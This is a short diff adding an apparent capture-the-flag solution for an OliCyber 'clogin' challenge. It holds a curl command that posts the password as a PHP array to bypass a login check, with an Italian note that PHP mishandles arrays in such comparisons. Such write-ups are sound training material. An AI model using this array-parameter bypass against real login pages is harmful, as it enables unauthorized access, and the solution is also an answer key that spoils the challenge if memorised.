@@ -1,0 +1,3 @@
+curl 'http://clogin.challs.olicyber.it/' --data-raw 'password[]=%22%22'
+
+PHP non degusta bene gli array in questi controlli
